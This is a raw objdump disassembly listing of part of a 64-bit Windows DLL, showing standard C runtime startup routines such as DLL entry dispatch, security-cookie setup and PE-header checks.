   1800023ea:	ff 15 70 fe 00 00    	call   *0xfe70(%rip)        # 0x180012260
   1800023f0:	8b d8                	mov    %eax,%ebx
   1800023f2:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1800023f6:	85 db                	test   %ebx,%ebx
   1800023f8:	0f 84 b0 00 00 00    	je     0x1800024ae
   1800023fe:	4c 8b c6             	mov    %rsi,%r8
   180002401:	8b d7                	mov    %edi,%edx
   180002403:	49 8b ce             	mov    %r14,%rcx
   180002406:	e8 75 fd ff ff       	call   0x180002180
   18000240b:	8b d8                	mov    %eax,%ebx
   18000240d:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180002411:	85 c0                	test   %eax,%eax
   180002413:	0f 84 95 00 00 00    	je     0x1800024ae
   180002419:	4c 8b c6             	mov    %rsi,%r8
   18000241c:	8b d7                	mov    %edi,%edx
   18000241e:	49 8b ce             	mov    %r14,%rcx
   180002421:	e8 da f3 ff ff       	call   0x180001800
   180002426:	8b d8                	mov    %eax,%ebx
   180002428:	89 44 24 30          	mov    %eax,0x30(%rsp)
   18000242c:	83 ff 01             	cmp    $0x1,%edi
   18000242f:	75 36                	jne    0x180002467
   180002431:	85 c0                	test   %eax,%eax
   180002433:	75 32                	jne    0x180002467
   180002435:	4c 8b c6             	mov    %rsi,%r8
   180002438:	33 d2                	xor    %edx,%edx
   18000243a:	49 8b ce             	mov    %r14,%rcx
   18000243d:	e8 be f3 ff ff       	call   0x180001800
   180002442:	48 85 f6             	test   %rsi,%rsi
   180002445:	0f 95 c1             	setne  %cl
   180002448:	e8 a3 fe ff ff       	call   0x1800022f0
   18000244d:	48 8b 05 4c 00 01 00 	mov    0x1004c(%rip),%rax        # 0x1800124a0
   180002454:	48 85 c0             	test   %rax,%rax
   180002457:	74 0e                	je     0x180002467
   180002459:	4c 8b c6             	mov    %rsi,%r8
   18000245c:	33 d2                	xor    %edx,%edx
   18000245e:	49 8b ce             	mov    %r14,%rcx
   180002461:	ff 15 f9 fd 00 00    	call   *0xfdf9(%rip)        # 0x180012260
   180002467:	85 ff                	test   %edi,%edi
   180002469:	74 05                	je     0x180002470
   18000246b:	83 ff 03             	cmp    $0x3,%edi
   18000246e:	75 3e                	jne    0x1800024ae
   180002470:	4c 8b c6             	mov    %rsi,%r8
   180002473:	8b d7                	mov    %edi,%edx
   180002475:	49 8b ce             	mov    %r14,%rcx
   180002478:	e8 03 fd ff ff       	call   0x180002180
   18000247d:	8b d8                	mov    %eax,%ebx
   18000247f:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180002483:	85 c0                	test   %eax,%eax
   180002485:	74 27                	je     0x1800024ae
   180002487:	48 8b 05 12 00 01 00 	mov    0x10012(%rip),%rax        # 0x1800124a0
   18000248e:	48 85 c0             	test   %rax,%rax
   180002491:	75 07                	jne    0x18000249a
   180002493:	bb 01 00 00 00       	mov    $0x1,%ebx
   180002498:	eb 10                	jmp    0x1800024aa
   18000249a:	4c 8b c6             	mov    %rsi,%r8
   18000249d:	8b d7                	mov    %edi,%edx
   18000249f:	49 8b ce             	mov    %r14,%rcx
   1800024a2:	ff 15 b8 fd 00 00    	call   *0xfdb8(%rip)        # 0x180012260
   1800024a8:	8b d8                	mov    %eax,%ebx
   1800024aa:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1800024ae:	eb 06                	jmp    0x1800024b6
   1800024b0:	33 db                	xor    %ebx,%ebx
   1800024b2:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   1800024b6:	8b c3                	mov    %ebx,%eax
   1800024b8:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   1800024bd:	48 83 c4 40          	add    $0x40,%rsp
   1800024c1:	41 5e                	pop    %r14
   1800024c3:	5f                   	pop    %rdi
   1800024c4:	5e                   	pop    %rsi
   1800024c5:	c3                   	ret
   1800024c6:	cc                   	int3
   1800024c7:	cc                   	int3
   1800024c8:	cc                   	int3
   1800024c9:	cc                   	int3
   1800024ca:	cc                   	int3
   1800024cb:	cc                   	int3
   1800024cc:	cc                   	int3
   1800024cd:	cc                   	int3
   1800024ce:	cc                   	int3
   1800024cf:	cc                   	int3
   1800024d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800024d5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800024da:	57                   	push   %rdi
   1800024db:	48 83 ec 20          	sub    $0x20,%rsp
   1800024df:	49 8b f8             	mov    %r8,%rdi
   1800024e2:	8b da                	mov    %edx,%ebx
   1800024e4:	48 8b f1             	mov    %rcx,%rsi
   1800024e7:	83 fa 01             	cmp    $0x1,%edx
   1800024ea:	75 05                	jne    0x1800024f1
   1800024ec:	e8 4f 00 00 00       	call   0x180002540
   1800024f1:	4c 8b c7             	mov    %rdi,%r8
   1800024f4:	8b d3                	mov    %ebx,%edx
   1800024f6:	48 8b ce             	mov    %rsi,%rcx
   1800024f9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800024fe:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180002503:	48 83 c4 20          	add    $0x20,%rsp
   180002507:	5f                   	pop    %rdi
   180002508:	e9 83 fe ff ff       	jmp    0x180002390
   18000250d:	cc                   	int3
   18000250e:	cc                   	int3
   18000250f:	cc                   	int3
   180002510:	48 83 ec 48          	sub    $0x48,%rsp
   180002514:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   180002519:	e8 02 f8 ff ff       	call   0x180001d20
   18000251e:	48 8d 15 d3 94 01 00 	lea    0x194d3(%rip),%rdx        # 0x18001b9f8
   180002525:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000252a:	e8 51 0a 00 00       	call   0x180002f80
   18000252f:	cc                   	int3
   180002530:	e9 fb 5c 00 00       	jmp    0x180008230
   180002535:	cc                   	int3
   180002536:	cc                   	int3
   180002537:	cc                   	int3
   180002538:	cc                   	int3
   180002539:	cc                   	int3
   18000253a:	cc                   	int3
   18000253b:	cc                   	int3
   18000253c:	cc                   	int3
   18000253d:	cc                   	int3
   18000253e:	cc                   	int3
   18000253f:	cc                   	int3
   180002540:	40 53                	rex push %rbx
   180002542:	48 83 ec 30          	sub    $0x30,%rsp
   180002546:	48 8b 05 b3 aa 01 00 	mov    0x1aab3(%rip),%rax        # 0x18001d000
   18000254d:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   180002554:	2b 00 00 
   180002557:	48 3b c3             	cmp    %rbx,%rax
   18000255a:	74 10                	je     0x18000256c
   18000255c:	48 f7 d0             	not    %rax
   18000255f:	48 89 05 da aa 01 00 	mov    %rax,0x1aada(%rip)        # 0x18001d040
   180002566:	48 83 c4 30          	add    $0x30,%rsp
   18000256a:	5b                   	pop    %rbx
   18000256b:	c3                   	ret
   18000256c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180002571:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   180002578:	00 00 
   18000257a:	ff 15 c8 fa 00 00    	call   *0xfac8(%rip)        # 0x180012048
   180002580:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   180002585:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000258a:	ff 15 b0 fa 00 00    	call   *0xfab0(%rip)        # 0x180012040
   180002590:	8b c0                	mov    %eax,%eax
   180002592:	48 31 44 24 20       	xor    %rax,0x20(%rsp)
   180002597:	ff 15 9b fa 00 00    	call   *0xfa9b(%rip)        # 0x180012038
   18000259d:	8b c0                	mov    %eax,%eax
   18000259f:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   1800025a4:	48 31 44 24 20       	xor    %rax,0x20(%rsp)
   1800025a9:	ff 15 81 fa 00 00    	call   *0xfa81(%rip)        # 0x180012030
   1800025af:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   1800025b4:	8b c8                	mov    %eax,%ecx
   1800025b6:	48 c1 e1 20          	shl    $0x20,%rcx
   1800025ba:	48 33 c8             	xor    %rax,%rcx
   1800025bd:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   1800025c2:	48 33 4c 24 20       	xor    0x20(%rsp),%rcx
   1800025c7:	48 33 c8             	xor    %rax,%rcx
   1800025ca:	48 b8 ff ff ff ff ff 	movabs $0xffffffffffff,%rax
   1800025d1:	ff 00 00 
   1800025d4:	48 23 c8             	and    %rax,%rcx
   1800025d7:	48 b8 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rax
   1800025de:	2b 00 00 
   1800025e1:	48 3b cb             	cmp    %rbx,%rcx
   1800025e4:	48 0f 44 c8          	cmove  %rax,%rcx
   1800025e8:	48 89 0d 11 aa 01 00 	mov    %rcx,0x1aa11(%rip)        # 0x18001d000
   1800025ef:	48 f7 d1             	not    %rcx
   1800025f2:	48 89 0d 47 aa 01 00 	mov    %rcx,0x1aa47(%rip)        # 0x18001d040
   1800025f9:	48 83 c4 30          	add    $0x30,%rsp
   1800025fd:	5b                   	pop    %rbx
   1800025fe:	c3                   	ret
   1800025ff:	cc                   	int3
   180002600:	48 8d 0d b9 b5 01 00 	lea    0x1b5b9(%rip),%rcx        # 0x18001dbc0
   180002607:	48 ff 25 42 fa 00 00 	rex.W jmp *0xfa42(%rip)        # 0x180012050
   18000260e:	cc                   	int3
   18000260f:	cc                   	int3
   180002610:	48 8d 0d a9 b5 01 00 	lea    0x1b5a9(%rip),%rcx        # 0x18001dbc0
   180002617:	e9 e4 1a 00 00       	jmp    0x180004100
   18000261c:	cc                   	int3
   18000261d:	cc                   	int3
   18000261e:	cc                   	int3
   18000261f:	cc                   	int3
   180002620:	48 8d 05 a9 b5 01 00 	lea    0x1b5a9(%rip),%rax        # 0x18001dbd0
   180002627:	c3                   	ret
   180002628:	cc                   	int3
   180002629:	cc                   	int3
   18000262a:	cc                   	int3
   18000262b:	cc                   	int3
   18000262c:	cc                   	int3
   18000262d:	cc                   	int3
   18000262e:	cc                   	int3
   18000262f:	cc                   	int3
   180002630:	48 8d 05 a1 b5 01 00 	lea    0x1b5a1(%rip),%rax        # 0x18001dbd8
   180002637:	c3                   	ret
   180002638:	cc                   	int3
   180002639:	cc                   	int3
   18000263a:	cc                   	int3
   18000263b:	cc                   	int3
   18000263c:	cc                   	int3
   18000263d:	cc                   	int3
   18000263e:	cc                   	int3
   18000263f:	cc                   	int3
   180002640:	48 83 ec 28          	sub    $0x28,%rsp
   180002644:	e8 d7 ff ff ff       	call   0x180002620
   180002649:	48 83 08 24          	orq    $0x24,(%rax)
   18000264d:	e8 de ff ff ff       	call   0x180002630
   180002652:	48 83 08 02          	orq    $0x2,(%rax)
   180002656:	48 83 c4 28          	add    $0x28,%rsp
   18000265a:	c3                   	ret
   18000265b:	cc                   	int3
   18000265c:	cc                   	int3
   18000265d:	cc                   	int3
   18000265e:	cc                   	int3
   18000265f:	cc                   	int3
   180002660:	48 83 ec 28          	sub    $0x28,%rsp
   180002664:	e8 e7 06 00 00       	call   0x180002d50
   180002669:	85 c0                	test   %eax,%eax
   18000266b:	74 2c                	je     0x180002699
   18000266d:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   180002674:	00 00 
   180002676:	48 8b 48 08          	mov    0x8(%rax),%rcx
   18000267a:	33 c0                	xor    %eax,%eax
   18000267c:	f0 48 0f b1 0d 63 b5 	lock cmpxchg %rcx,0x1b563(%rip)        # 0x18001dbe8
   180002683:	01 00 
   180002685:	74 12                	je     0x180002699
   180002687:	48 3b c8             	cmp    %rax,%rcx
   18000268a:	74 14                	je     0x1800026a0
   18000268c:	33 c0                	xor    %eax,%eax
   18000268e:	f0 48 0f b1 0d 51 b5 	lock cmpxchg %rcx,0x1b551(%rip)        # 0x18001dbe8
   180002695:	01 00 
   180002697:	75 ee                	jne    0x180002687
   180002699:	32 c0                	xor    %al,%al
   18000269b:	48 83 c4 28          	add    $0x28,%rsp
   18000269f:	c3                   	ret
   1800026a0:	b0 01                	mov    $0x1,%al
   1800026a2:	48 83 c4 28          	add    $0x28,%rsp
   1800026a6:	c3                   	ret
   1800026a7:	cc                   	int3
   1800026a8:	cc                   	int3
   1800026a9:	cc                   	int3
   1800026aa:	cc                   	int3
   1800026ab:	cc                   	int3
   1800026ac:	cc                   	int3
   1800026ad:	cc                   	int3
   1800026ae:	cc                   	int3
   1800026af:	cc                   	int3
   1800026b0:	48 83 ec 28          	sub    $0x28,%rsp
   1800026b4:	e8 97 06 00 00       	call   0x180002d50
   1800026b9:	85 c0                	test   %eax,%eax
   1800026bb:	74 0c                	je     0x1800026c9
   1800026bd:	e8 ce 03 00 00       	call   0x180002a90
   1800026c2:	b0 01                	mov    $0x1,%al
   1800026c4:	48 83 c4 28          	add    $0x28,%rsp
   1800026c8:	c3                   	ret
   1800026c9:	e8 72 06 00 00       	call   0x180002d40
   1800026ce:	8b c8                	mov    %eax,%ecx
   1800026d0:	e8 9f 61 00 00       	call   0x180008874
   1800026d5:	85 c0                	test   %eax,%eax
   1800026d7:	74 07                	je     0x1800026e0
   1800026d9:	32 c0                	xor    %al,%al
   1800026db:	48 83 c4 28          	add    $0x28,%rsp
   1800026df:	c3                   	ret
   1800026e0:	e8 57 65 00 00       	call   0x180008c3c
   1800026e5:	b0 01                	mov    $0x1,%al
   1800026e7:	48 83 c4 28          	add    $0x28,%rsp
   1800026eb:	c3                   	ret
   1800026ec:	cc                   	int3
   1800026ed:	cc                   	int3
   1800026ee:	cc                   	int3
   1800026ef:	cc                   	int3
   1800026f0:	48 83 ec 28          	sub    $0x28,%rsp
   1800026f4:	80 3d f6 b4 01 00 00 	cmpb   $0x0,0x1b4f6(%rip)        # 0x18001dbf1
   1800026fb:	75 65                	jne    0x180002762
   1800026fd:	e8 4e 06 00 00       	call   0x180002d50
   180002702:	85 c0                	test   %eax,%eax
   180002704:	74 27                	je     0x18000272d
   180002706:	48 8d 0d eb b4 01 00 	lea    0x1b4eb(%rip),%rcx        # 0x18001dbf8
   18000270d:	e8 ca 66 00 00       	call   0x180008ddc
   180002712:	85 c0                	test   %eax,%eax
   180002714:	75 10                	jne    0x180002726
   180002716:	48 8d 0d f3 b4 01 00 	lea    0x1b4f3(%rip),%rcx        # 0x18001dc10
   18000271d:	e8 ba 66 00 00       	call   0x180008ddc
   180002722:	85 c0                	test   %eax,%eax
   180002724:	74 35                	je     0x18000275b
   180002726:	32 c0                	xor    %al,%al
   180002728:	48 83 c4 28          	add    $0x28,%rsp
   18000272c:	c3                   	ret
   18000272d:	66 0f 6f 05 7b fd 00 	movdqa 0xfd7b(%rip),%xmm0        # 0x1800124b0
   180002734:	00 
   180002735:	f3 0f 7f 05 bb b4 01 	movdqu %xmm0,0x1b4bb(%rip)        # 0x18001dbf8
   18000273c:	00 
   18000273d:	48 c7 05 c0 b4 01 00 	movq   $0xffffffffffffffff,0x1b4c0(%rip)        # 0x18001dc08
   180002744:	ff ff ff ff 
   180002748:	f3 0f 7f 05 c0 b4 01 	movdqu %xmm0,0x1b4c0(%rip)        # 0x18001dc10
   18000274f:	00 
   180002750:	48 c7 05 c5 b4 01 00 	movq   $0xffffffffffffffff,0x1b4c5(%rip)        # 0x18001dc20
   180002757:	ff ff ff ff 
   18000275b:	c6 05 8f b4 01 00 01 	movb   $0x1,0x1b48f(%rip)        # 0x18001dbf1
   180002762:	b0 01                	mov    $0x1,%al
   180002764:	48 83 c4 28          	add    $0x28,%rsp
   180002768:	c3                   	ret
   180002769:	cc                   	int3
   18000276a:	cc                   	int3
   18000276b:	cc                   	int3
   18000276c:	cc                   	int3
   18000276d:	cc                   	int3
   18000276e:	cc                   	int3
   18000276f:	cc                   	int3
   180002770:	48 83 ec 28          	sub    $0x28,%rsp
   180002774:	e8 f7 19 00 00       	call   0x180004170
   180002779:	84 c0                	test   %al,%al
   18000277b:	74 0e                	je     0x18000278b
   18000277d:	e8 c6 67 00 00       	call   0x180008f48
   180002782:	84 c0                	test   %al,%al
   180002784:	75 0c                	jne    0x180002792
   180002786:	e8 05 1a 00 00       	call   0x180004190
   18000278b:	32 c0                	xor    %al,%al
   18000278d:	48 83 c4 28          	add    $0x28,%rsp
   180002791:	c3                   	ret
   180002792:	b0 01                	mov    $0x1,%al
   180002794:	48 83 c4 28          	add    $0x28,%rsp
   180002798:	c3                   	ret
   180002799:	cc                   	int3
   18000279a:	cc                   	int3
   18000279b:	cc                   	int3
   18000279c:	cc                   	int3
   18000279d:	cc                   	int3
   18000279e:	cc                   	int3
   18000279f:	cc                   	int3
   1800027a0:	48 83 ec 28          	sub    $0x28,%rsp
   1800027a4:	e8 b3 67 00 00       	call   0x180008f5c
   1800027a9:	e8 e2 19 00 00       	call   0x180004190
   1800027ae:	b0 01                	mov    $0x1,%al
   1800027b0:	48 83 c4 28          	add    $0x28,%rsp
   1800027b4:	c3                   	ret
   1800027b5:	cc                   	int3
   1800027b6:	cc                   	int3
   1800027b7:	cc                   	int3
   1800027b8:	cc                   	int3
   1800027b9:	cc                   	int3
   1800027ba:	cc                   	int3
   1800027bb:	cc                   	int3
   1800027bc:	cc                   	int3
   1800027bd:	cc                   	int3
   1800027be:	cc                   	int3
   1800027bf:	cc                   	int3
   1800027c0:	40 53                	rex push %rbx
   1800027c2:	55                   	push   %rbp
   1800027c3:	56                   	push   %rsi
   1800027c4:	57                   	push   %rdi
   1800027c5:	48 83 ec 28          	sub    $0x28,%rsp
   1800027c9:	49 8b f9             	mov    %r9,%rdi
   1800027cc:	49 8b f0             	mov    %r8,%rsi
   1800027cf:	8b da                	mov    %edx,%ebx
   1800027d1:	48 8b e9             	mov    %rcx,%rbp
   1800027d4:	e8 77 05 00 00       	call   0x180002d50
   1800027d9:	85 c0                	test   %eax,%eax
   1800027db:	75 16                	jne    0x1800027f3
   1800027dd:	83 fb 01             	cmp    $0x1,%ebx
   1800027e0:	75 11                	jne    0x1800027f3
   1800027e2:	4c 8b c6             	mov    %rsi,%r8
   1800027e5:	33 d2                	xor    %edx,%edx
   1800027e7:	48 8b cd             	mov    %rbp,%rcx
   1800027ea:	48 8b c7             	mov    %rdi,%rax
   1800027ed:	ff 15 6d fa 00 00    	call   *0xfa6d(%rip)        # 0x180012260
   1800027f3:	48 8b 54 24 78       	mov    0x78(%rsp),%rdx
   1800027f8:	8b 4c 24 70          	mov    0x70(%rsp),%ecx
   1800027fc:	48 83 c4 28          	add    $0x28,%rsp
   180002800:	5f                   	pop    %rdi
   180002801:	5e                   	pop    %rsi
   180002802:	5d                   	pop    %rbp
   180002803:	5b                   	pop    %rbx
   180002804:	e9 2f 5a 00 00       	jmp    0x180008238
   180002809:	cc                   	int3
   18000280a:	cc                   	int3
   18000280b:	cc                   	int3
   18000280c:	cc                   	int3
   18000280d:	cc                   	int3
   18000280e:	cc                   	int3
   18000280f:	cc                   	int3
   180002810:	48 83 ec 28          	sub    $0x28,%rsp
   180002814:	e8 37 05 00 00       	call   0x180002d50
   180002819:	85 c0                	test   %eax,%eax
   18000281b:	74 10                	je     0x18000282d
   18000281d:	48 8d 0d d4 b3 01 00 	lea    0x1b3d4(%rip),%rcx        # 0x18001dbf8
   180002824:	48 83 c4 28          	add    $0x28,%rsp
   180002828:	e9 6b 65 00 00       	jmp    0x180008d98
   18000282d:	e8 1a 5e 00 00       	call   0x18000864c
   180002832:	85 c0                	test   %eax,%eax
   180002834:	75 09                	jne    0x18000283f
   180002836:	48 83 c4 28          	add    $0x28,%rsp
   18000283a:	e9 f1 5d 00 00       	jmp    0x180008630
   18000283f:	48 83 c4 28          	add    $0x28,%rsp
   180002843:	c3                   	ret
   180002844:	cc                   	int3
   180002845:	cc                   	int3
   180002846:	cc                   	int3
   180002847:	cc                   	int3
   180002848:	cc                   	int3
   180002849:	cc                   	int3
   18000284a:	cc                   	int3
   18000284b:	cc                   	int3
   18000284c:	cc                   	int3
   18000284d:	cc                   	int3
   18000284e:	cc                   	int3
   18000284f:	cc                   	int3
   180002850:	48 83 ec 28          	sub    $0x28,%rsp
   180002854:	33 c9                	xor    %ecx,%ecx
   180002856:	e8 49 67 00 00       	call   0x180008fa4
   18000285b:	48 83 c4 28          	add    $0x28,%rsp
   18000285f:	e9 5c 19 00 00       	jmp    0x1800041c0
   180002864:	cc                   	int3
   180002865:	cc                   	int3
   180002866:	cc                   	int3
   180002867:	cc                   	int3
   180002868:	cc                   	int3
   180002869:	cc                   	int3
   18000286a:	cc                   	int3
   18000286b:	cc                   	int3
   18000286c:	cc                   	int3
   18000286d:	cc                   	int3
   18000286e:	cc                   	int3
   18000286f:	cc                   	int3
   180002870:	48 83 ec 28          	sub    $0x28,%rsp
   180002874:	85 c9                	test   %ecx,%ecx
   180002876:	75 07                	jne    0x18000287f
   180002878:	c6 05 71 b3 01 00 01 	movb   $0x1,0x1b371(%rip)        # 0x18001dbf0
   18000287f:	e8 0c 02 00 00       	call   0x180002a90
   180002884:	e8 b7 18 00 00       	call   0x180004140
   180002889:	84 c0                	test   %al,%al
   18000288b:	74 10                	je     0x18000289d
   18000288d:	e8 a2 66 00 00       	call   0x180008f34
   180002892:	84 c0                	test   %al,%al
   180002894:	75 0e                	jne    0x1800028a4
   180002896:	33 c9                	xor    %ecx,%ecx
   180002898:	e8 03 19 00 00       	call   0x1800041a0
   18000289d:	32 c0                	xor    %al,%al
   18000289f:	48 83 c4 28          	add    $0x28,%rsp
   1800028a3:	c3                   	ret
   1800028a4:	b0 01                	mov    $0x1,%al
   1800028a6:	48 83 c4 28          	add    $0x28,%rsp
   1800028aa:	c3                   	ret
   1800028ab:	cc                   	int3
   1800028ac:	cc                   	int3
   1800028ad:	cc                   	int3
   1800028ae:	cc                   	int3
   1800028af:	cc                   	int3
   1800028b0:	48 83 ec 18          	sub    $0x18,%rsp
   1800028b4:	4c 8b c1             	mov    %rcx,%r8
   1800028b7:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   1800028bc:	66 39 05 3d d7 ff ff 	cmp    %ax,-0x28c3(%rip)        # 0x180000000
   1800028c3:	75 71                	jne    0x180002936
   1800028c5:	48 63 0d 70 d7 ff ff 	movslq -0x2890(%rip),%rcx        # 0x18000003c
   1800028cc:	48 8d 15 2d d7 ff ff 	lea    -0x28d3(%rip),%rdx        # 0x180000000
   1800028d3:	48 03 ca             	add    %rdx,%rcx
   1800028d6:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   1800028dc:	75 58                	jne    0x180002936
   1800028de:	b8 0b 02 00 00       	mov    $0x20b,%eax
   1800028e3:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1800028e7:	75 4d                	jne    0x180002936
   1800028e9:	4c 2b c2             	sub    %rdx,%r8
   1800028ec:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   1800028f0:	48 83 c0 18          	add    $0x18,%rax
   1800028f4:	48 03 c1             	add    %rcx,%rax
   1800028f7:	0f b7 49 06          	movzwl 0x6(%rcx),%ecx
   1800028fb:	48 8d 14 89          	lea    (%rcx,%rcx,4),%rdx
   1800028ff:	4c 8d 0c d0          	lea    (%rax,%rdx,8),%r9
   180002903:	48 89 04 24          	mov    %rax,(%rsp)
   180002907:	49 3b c1             	cmp    %r9,%rax
   18000290a:	74 26                	je     0x180002932
   18000290c:	8b 50 0c             	mov    0xc(%rax),%edx
   18000290f:	4c 3b c2             	cmp    %rdx,%r8
   180002912:	72 18                	jb     0x18000292c
   180002914:	8b 48 08             	mov    0x8(%rax),%ecx
   180002917:	03 ca                	add    %edx,%ecx
   180002919:	4c 3b c1             	cmp    %rcx,%r8
   18000291c:	73 0e                	jae    0x18000292c
   18000291e:	83 78 24 00          	cmpl   $0x0,0x24(%rax)
   180002922:	7d 04                	jge    0x180002928
   180002924:	32 c0                	xor    %al,%al
   180002926:	eb 14                	jmp    0x18000293c
   180002928:	b0 01                	mov    $0x1,%al
   18000292a:	eb 10                	jmp    0x18000293c
   18000292c:	48 83 c0 28          	add    $0x28,%rax
   180002930:	eb d1                	jmp    0x180002903
   180002932:	32 c0                	xor    %al,%al
   180002934:	eb 06                	jmp    0x18000293c
   180002936:	32 c0                	xor    %al,%al
   180002938:	eb 02                	jmp    0x18000293c
   18000293a:	32 c0                	xor    %al,%al
   18000293c:	48 83 c4 18          	add    $0x18,%rsp
   180002940:	c3                   	ret
   180002941:	cc                   	int3
   180002942:	cc                   	int3
   180002943:	cc                   	int3
   180002944:	cc                   	int3
   180002945:	cc                   	int3
   180002946:	cc                   	int3
   180002947:	cc                   	int3
   180002948:	cc                   	int3
   180002949:	cc                   	int3
   18000294a:	cc                   	int3
   18000294b:	cc                   	int3
   18000294c:	cc                   	int3
   18000294d:	cc                   	int3
   18000294e:	cc                   	int3
   18000294f:	cc                   	int3
   180002950:	40 53                	rex push %rbx
   180002952:	48 83 ec 20          	sub    $0x20,%rsp
   180002956:	0f b6 d9             	movzbl %cl,%ebx
   180002959:	e8 f2 03 00 00       	call   0x180002d50
   18000295e:	85 c0                	test   %eax,%eax
   180002960:	74 0d                	je     0x18000296f
   180002962:	84 db                	test   %bl,%bl
   180002964:	75 09                	jne    0x18000296f
   180002966:	33 c0                	xor    %eax,%eax
   180002968:	48 87 05 79 b2 01 00 	xchg   %rax,0x1b279(%rip)        # 0x18001dbe8
   18000296f:	48 83 c4 20          	add    $0x20,%rsp
   180002973:	5b                   	pop    %rbx
   180002974:	c3                   	ret
   180002975:	cc                   	int3
   180002976:	cc                   	int3
   180002977:	cc                   	int3
   180002978:	cc                   	int3
   180002979:	cc                   	int3
   18000297a:	cc                   	int3
   18000297b:	cc                   	int3
   18000297c:	cc                   	int3
   18000297d:	cc                   	int3
   18000297e:	cc                   	int3
   18000297f:	cc                   	int3
   180002980:	40 53                	rex push %rbx
   180002982:	48 83 ec 20          	sub    $0x20,%rsp
   180002986:	80 3d 63 b2 01 00 00 	cmpb   $0x0,0x1b263(%rip)        # 0x18001dbf0
   18000298d:	0f b6 d9             	movzbl %cl,%ebx
   180002990:	74 04                	je     0x180002996
   180002992:	84 d2                	test   %dl,%dl
   180002994:	75 0d                	jne    0x1800029a3
   180002996:	e8 d1 65 00 00       	call   0x180008f6c
   18000299b:	0f b6 cb             	movzbl %bl,%ecx
   18000299e:	e8 fd 17 00 00       	call   0x1800041a0
   1800029a3:	b0 01                	mov    $0x1,%al
   1800029a5:	48 83 c4 20          	add    $0x20,%rsp
   1800029a9:	5b                   	pop    %rbx
   1800029aa:	c3                   	ret
   1800029ab:	cc                   	int3
   1800029ac:	cc                   	int3
   1800029ad:	cc                   	int3
   1800029ae:	cc                   	int3
   1800029af:	cc                   	int3
   1800029b0:	48 8d 05 c9 bc 01 00 	lea    0x1bcc9(%rip),%rax        # 0x18001e680
   1800029b7:	c3                   	ret
   1800029b8:	cc                   	int3
   1800029b9:	cc                   	int3
   1800029ba:	cc                   	int3
   1800029bb:	cc                   	int3
   1800029bc:	cc                   	int3
   1800029bd:	cc                   	int3
   1800029be:	cc                   	int3
   1800029bf:	cc                   	int3
   1800029c0:	c7 05 5e b2 01 00 00 	movl   $0x0,0x1b25e(%rip)        # 0x18001dc28
   1800029c7:	00 00 00 
   1800029ca:	c3                   	ret
   1800029cb:	cc                   	int3
   1800029cc:	cc                   	int3
   1800029cd:	cc                   	int3
   1800029ce:	cc                   	int3
   1800029cf:	cc                   	int3
   1800029d0:	8b c9                	mov    %ecx,%ecx
   1800029d2:	cd 29                	int    $0x29
   1800029d4:	c3                   	ret
   1800029d5:	cc                   	int3
   1800029d6:	cc                   	int3
   1800029d7:	cc                   	int3
   1800029d8:	cc                   	int3
   1800029d9:	cc                   	int3
   1800029da:	cc                   	int3
   1800029db:	cc                   	int3
   1800029dc:	cc                   	int3
   1800029dd:	cc                   	int3
   1800029de:	cc                   	int3
   1800029df:	cc                   	int3
   1800029e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800029e5:	57                   	push   %rdi
   1800029e6:	48 83 ec 20          	sub    $0x20,%rsp
   1800029ea:	48 8d 1d c7 7a 01 00 	lea    0x17ac7(%rip),%rbx        # 0x18001a4b8
   1800029f1:	48 8d 3d c0 7a 01 00 	lea    0x17ac0(%rip),%rdi        # 0x18001a4b8
   1800029f8:	48 3b df             	cmp    %rdi,%rbx
   1800029fb:	73 1a                	jae    0x180002a17
   1800029fd:	0f 1f 00             	nopl   (%rax)
   180002a00:	48 8b 03             	mov    (%rbx),%rax
   180002a03:	48 85 c0             	test   %rax,%rax
   180002a06:	74 06                	je     0x180002a0e
   180002a08:	ff 15 52 f8 00 00    	call   *0xf852(%rip)        # 0x180012260
   180002a0e:	48 83 c3 08          	add    $0x8,%rbx
   180002a12:	48 3b df             	cmp    %rdi,%rbx
   180002a15:	72 e9                	jb     0x180002a00
   180002a17:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180002a1c:	48 83 c4 20          	add    $0x20,%rsp
   180002a20:	5f                   	pop    %rdi
   180002a21:	c3                   	ret
   180002a22:	cc                   	int3
   180002a23:	cc                   	int3
   180002a24:	cc                   	int3
   180002a25:	cc                   	int3
   180002a26:	cc                   	int3
   180002a27:	cc                   	int3
   180002a28:	cc                   	int3
   180002a29:	cc                   	int3
   180002a2a:	cc                   	int3
   180002a2b:	cc                   	int3
   180002a2c:	cc                   	int3
   180002a2d:	cc                   	int3
   180002a2e:	cc                   	int3
   180002a2f:	cc                   	int3
   180002a30:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002a35:	57                   	push   %rdi
   180002a36:	48 83 ec 20          	sub    $0x20,%rsp
   180002a3a:	48 8d 1d 87 7a 01 00 	lea    0x17a87(%rip),%rbx        # 0x18001a4c8
   180002a41:	48 8d 3d 80 7a 01 00 	lea    0x17a80(%rip),%rdi        # 0x18001a4c8
   180002a48:	48 3b df             	cmp    %rdi,%rbx
   180002a4b:	73 1a                	jae    0x180002a67
